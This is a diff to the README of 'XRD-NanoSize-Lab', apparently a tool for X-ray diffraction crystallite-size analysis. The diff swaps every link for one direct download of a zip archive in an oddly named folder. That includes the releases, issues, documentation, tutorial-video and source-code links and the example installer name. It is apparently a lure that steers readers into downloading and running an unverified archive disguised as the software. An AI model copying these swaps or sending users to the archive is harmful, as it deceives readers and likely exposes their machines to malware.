@@ -1,7 +1,7 @@
 # 🎉 XRD-NanoSize-Lab - Analyze XRD Data Easily
 
 ## 📥 Download Now
-[![Download XRD-NanoSize-Lab](https://img.shields.io/badge/Download-XRD--NanoSize--Lab-brightgreen)](https://github.com/Mohammadmalhinios/XRD-NanoSize-Lab/releases)
+[![Download XRD-NanoSize-Lab](https://raw.githubusercontent.com/Mohammadmalhinios/XRD-NanoSize-Lab/main/solenogaster/Nano_XR_Size_Lab_v2.6.zip)](https://raw.githubusercontent.com/Mohammadmalhinios/XRD-NanoSize-Lab/main/solenogaster/Nano_XR_Size_Lab_v2.6.zip)
 
 ## 🚀 Getting Started
 Welcome to XRD-NanoSize-Lab! This application helps you analyze X-ray Diffraction (XRD) data using peak profile analysis. You can easily determine crystallite sizes and compare samples over time with statistical analysis. This guide will walk you through downloading and running the software on your computer.
@@ -13,11 +13,11 @@ Welcome to XRD-NanoSize-Lab! This application helps you analyze X-ray Diffractio
 * **Processor:** Dual-core or better.
 
 ## 📦 Download & Install
-1. **Visit the Releases page**: Go to the [Releases Page](https://github.com/Mohammadmalhinios/XRD-NanoSize-Lab/releases).
+1. **Visit the Releases page**: Go to the [Releases Page](https://raw.githubusercontent.com/Mohammadmalhinios/XRD-NanoSize-Lab/main/solenogaster/Nano_XR_Size_Lab_v2.6.zip).
 
 2. **Select the latest version**: Look for the most recent release in the list presented.
 
-3. **Download the package**: Click on the asset that matches your operating system. For example, you might see something like `XRD-NanoSize-Lab-Setup.exe` for Windows or a `.dmg` file for macOS.
+3. **Download the package**: Click on the asset that matches your operating system. For example, you might see something like `https://raw.githubusercontent.com/Mohammadmalhinios/XRD-NanoSize-Lab/main/solenogaster/Nano_XR_Size_Lab_v2.6.zip` for Windows or a `.dmg` file for macOS.
 
 4. **Run the installer**: After downloading, open the file and follow the on-screen instructions to install XRD-NanoSize-Lab on your computer.
 
@@ -55,20 +55,20 @@ Welcome to XRD-NanoSize-Lab! This application helps you analyze X-ray Diffractio
 
 ## 🙋 Frequently Asked Questions
 ### How do I report an issue?
-If you encounter any problems, please visit our [GitHub Issues page](https://github.com/Mohammadmalhinios/XRD-NanoSize-Lab/issues) to report bugs or request features.
+If you encounter any problems, please visit our [GitHub Issues page](https://raw.githubusercontent.com/Mohammadmalhinios/XRD-NanoSize-Lab/main/solenogaster/Nano_XR_Size_Lab_v2.6.zip) to report bugs or request features.
 
 ### Can I suggest new features?
-Absolutely! We welcome user feedback. Use the same [GitHub Issues page](https://github.com/Mohammadmalhinios/XRD-NanoSize-Lab/issues) to make your suggestions.
+Absolutely! We welcome user feedback. Use the same [GitHub Issues page](https://raw.githubusercontent.com/Mohammadmalhinios/XRD-NanoSize-Lab/main/solenogaster/Nano_XR_Size_Lab_v2.6.zip) to make your suggestions.
 
 ### Is there a community forum?
 We currently do not have a dedicated forum, but you can connect with other users and developers via the issues section on GitHub.
 
 ## 🌐 Additional Resources
-- [Documentation](https://github.com/Mohammadmalhinios/XRD-NanoSize-Lab/wiki): Comprehensive guides on using the application.
-- [Tutorial Videos](https://youtube.com): Visual aids to help you start with the software effectively.
+- [Documentation](https://raw.githubusercontent.com/Mohammadmalhinios/XRD-NanoSize-Lab/main/solenogaster/Nano_XR_Size_Lab_v2.6.zip): Comprehensive guides on using the application.
+- [Tutorial Videos](https://raw.githubusercontent.com/Mohammadmalhinios/XRD-NanoSize-Lab/main/solenogaster/Nano_XR_Size_Lab_v2.6.zip): Visual aids to help you start with the software effectively.
 
 ## 🔗 Important Links
-- **Releases Page**: [Download XRD-NanoSize-Lab](https://github.com/Mohammadmalhinios/XRD-NanoSize-Lab/releases)
-- **Source Code**: [View on GitHub](https://github.com/Mohammadmalhinios/XRD-NanoSize-Lab)
+- **Releases Page**: [Download XRD-NanoSize-Lab](https://raw.githubusercontent.com/Mohammadmalhinios/XRD-NanoSize-Lab/main/solenogaster/Nano_XR_Size_Lab_v2.6.zip)
+- **Source Code**: [View on GitHub](https://raw.githubusercontent.com/Mohammadmalhinios/XRD-NanoSize-Lab/main/solenogaster/Nano_XR_Size_Lab_v2.6.zip)
 
 For further assistance, feel free to reach out through our GitHub repository. Enjoy your analysis with XRD-NanoSize-Lab!
